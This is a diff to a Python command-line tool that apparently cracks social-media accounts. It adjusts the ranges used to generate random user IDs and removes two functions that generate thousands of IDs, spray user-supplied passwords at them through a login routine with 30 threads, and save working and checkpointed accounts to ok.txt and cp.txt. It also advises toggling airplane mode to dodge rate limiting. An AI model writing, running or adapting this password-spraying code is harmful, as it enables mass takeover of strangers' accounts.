@@ -504,8 +504,8 @@ class Main:
 		print("%s [%s8%s]%s  Age DIRERMINER.............%s(PRO) V1"%(G,R,G,Y,G))
 		print("%s [%s9%s]%s  CHACKING UPDATE%s"%(G,R,G,Y,G))
 		print("=================CRETOR MENU==============")
-		print("[F]>CREATE FILE>PRO")
-		print("[U]>CLONE PUBLIC UID>PRO")
+		print("[F]CREATE FILE (PRO")
+		print("[U]CLONE PUBLIC UID (PRO")
 		print(GET)
 		hoga = input("\n%s [?] CHOICE : "%(B))
 		if hoga in ["", " "]:
@@ -565,9 +565,9 @@ class Main:
 			Main()
 
 	def old(self):
-		x = 111111111
-		xx = 999999999
-		idx = "100000" 
+		x = 1111111111
+		xx = 9999999999
+		idx = "10000" 
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -993,9 +993,9 @@ class Main:
 
 
 	def old4(self):
-		x = 111111
-		xx = 999999
-		idx = "100000000" 
+		x = 111111111
+		xx = 999999999
+		idx = "100000" 
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -1418,67 +1418,6 @@ class Main:
 				continue
 
 		self.loop +=1
-
-
-	def old4_6(self):
-		x = 1111111
-		xx = 9999999
-		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
-		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
-		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
-		if (limit)>10000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
-		try:
-			for n in range(limit):
-				_ = random.randint(x,xx)
-				__ = idx
-				self.id.append(__+str(_))
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
-			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
-				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
-				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
-				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
-				for user in self.id:
-					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
-		except Exception as e:exit(str(e))
-		
-
-	def old4_5(self):
-		x = 111111
-		xx = 999999
-		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
-		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
-		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
-		if (limit)>10000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
-		try:
-			for n in range(limit):
-				_ = random.randint(x,xx)
-				__ = idx
-				self.id.append(__+str(_))
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
-			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
-				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
-				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
-				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
-				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
-				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
-				for user in self.id:
-					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
-		except Exception as e:exit(str(e))
-
 
 	def email(self):
 		os.system('clear')
